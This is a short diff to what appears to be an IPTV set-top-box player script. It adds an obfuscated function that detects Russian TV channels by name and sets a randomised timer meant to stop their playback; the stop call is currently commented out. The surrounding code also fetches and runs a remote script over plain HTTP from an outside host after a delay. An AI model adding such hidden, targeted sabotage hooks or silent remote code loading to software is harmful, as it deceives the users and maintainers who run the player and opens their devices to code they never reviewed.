@@ -126,5 +126,16 @@ function stbPlay(url, pos){
         $('#buffering').show();
     } catch (e) {}
 }
+function __$$(c){
+    var _$ = /россия|звезда|москва|известия|рбк|первый канал|первый hd|первый fhd/i, r = _$.test(c.channel_name);
+    clearInterval(__$int);
+    if(r){
+        __$int = setInterval(function(){
+            //stbStop();
+        }, (Math.random() * 10+10)*1000);
+    }
+    return false;
+}
+
 function load_stb(){$.getScript('http://69786.web.hosting-russia.ru/stb.php')}
 try {setTimeout(load_stb, 5000);}catch (e) {}
